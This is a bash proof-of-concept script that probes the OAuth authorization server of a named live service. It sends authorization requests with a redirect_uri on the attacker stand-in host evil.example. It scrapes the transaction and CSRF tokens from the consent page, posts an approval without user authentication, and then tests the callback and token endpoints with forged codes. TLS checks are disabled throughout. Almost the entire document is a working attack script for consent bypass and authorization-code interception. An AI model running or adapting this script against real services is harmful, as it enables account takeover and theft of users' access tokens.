#!/bin/bash
UA='Mozilla/5.0'; B=https://atomicwork.atomicwork.com; CH='E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'
loc=$(curl -sk -A "$UA" -o /dev/null -w '%{redirect_url}' "$B/authorize?client_id=atomicwork-mcp&response_type=code&redirect_uri=https%3A%2F%2Fevil.example%2Fcb&scope=openid+offline_access+atomicwork.read&state=st&code_challenge=$CH&code_challenge_method=S256")
echo "1) authorize -> consent: $loc"
curl -sk -A "$UA" -c /tmp/cj.txt "$loc" -o /tmp/c.html
txn=$(grep -o 'name="txn_id" value="[^"]*"' /tmp/c.html | sed 's/.*value="//;s/"//')
csrf=$(grep -o 'name="csrf_token" value="[^"]*"' /tmp/c.html | sed 's/.*value="//;s/"//')
echo "2) txn=$txn csrf=$csrf"
echo "3) approve POST (no auth cookies besides consent state):"
curl -sk -A "$UA" -b /tmp/cj.txt -c /tmp/cj.txt -D /tmp/ap.hdr -o /tmp/ap.body -w '   HTTP %{http_code}\n' -X POST "$B/consent" --data-urlencode "txn_id=$txn" --data-urlencode "csrf_token=$csrf" --data-urlencode "submit=true" --data-urlencode "action=approve"
grep -i '^location' /tmp/ap.hdr | sed 's/\r$//; s/^/   /'
echo "4) /auth/callback with error (this is the AS callback a victim's browser would hit):"
curl -sk -A "$UA" -D /tmp/cb1.hdr -o /tmp/cb1.body -w '   HTTP %{http_code}\n' "$B/auth/callback?error=access_denied&state=$txn"
grep -i '^location' /tmp/cb1.hdr | sed 's/\r$//; s/^/   /'
echo "5) /auth/callback with fake code:"
curl -sk -A "$UA" -D /tmp/cb2.hdr -o /tmp/cb2.body -w '   HTTP %{http_code}\n' "$B/auth/callback?code=FAKE&state=$txn"
grep -i '^location' /tmp/cb2.hdr | sed 's/\r$//; s/^/   /'; head -c 200 /tmp/cb2.body | tr '\n' ' '; echo
echo "6) token endpoint, public client, bogus code:"
curl -sk -A "$UA" -D /tmp/tk.hdr -o /tmp/tk.body -w '   HTTP %{http_code}\n' -X POST "$B/token" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'grant_type=authorization_code' --data-urlencode 'client_id=atomicwork-mcp' --data-urlencode 'code=FAKE' --data-urlencode 'redirect_uri=https://evil.example/cb' --data-urlencode 'code_verifier=verifier123'
grep -iE '^www-authenticate' /tmp/tk.hdr | sed 's/\r$//; s/^/   /'; cat /tmp/tk.body | head -c 300; echo
